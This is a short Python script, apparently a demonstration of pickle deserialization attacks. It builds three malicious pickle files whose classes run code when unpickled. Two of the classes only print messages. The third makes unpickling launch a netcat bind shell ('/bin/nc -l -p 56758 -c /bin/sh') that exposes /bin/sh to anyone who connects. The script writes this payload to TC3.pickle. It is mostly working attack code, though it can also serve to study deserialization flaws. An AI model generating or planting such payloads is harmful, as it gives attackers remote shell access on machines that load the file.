#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
import subprocess

class TwistedClass1:
    def __reduce__(self):
        print("You have been twisted: what will be unpickled is not what you think.")
        return (int, (5,))
        
class TwistedClass2:
    def __init__(self, name):
        self.name = name
    
    def __getstate__(self):
        return self.name
    
    def __setstate__(self, state):
        self.name = state
        print("You have been twisted: when unpickling there are extra you don't know about.")

class TwistedClass3:
    def __reduce__(self):
        print("You have been twisted again: what will be unpickled is not what you think.")
        return (subprocess.Popen, ('/bin/nc','-l', '-p 56758', '-c /bin/sh'))

def serialize(x, fname):
    import pickle
    import pickletools
    
    print("Pickling: {} {}:".format(x, type(x)))
    # Create Instance and Pickle it:
    payload = pickle.dumps(x, protocol=0) # Lowest Protocol is Human-readable
    
    # Disassemble Pickle Payload:
    pickletools.dis(payload)
    
    with open(fname, "wb") as file:
        file.write(payload)

def main():
    
    serialize(TwistedClass1(), "TC1.pickle")
    serialize(TwistedClass2("Ooops"), "TC2.pickle")
    serialize(TwistedClass3(), "TC3.pickle")
    
    sys.exit(0)
    
if __name__ == "__main__":
    main()
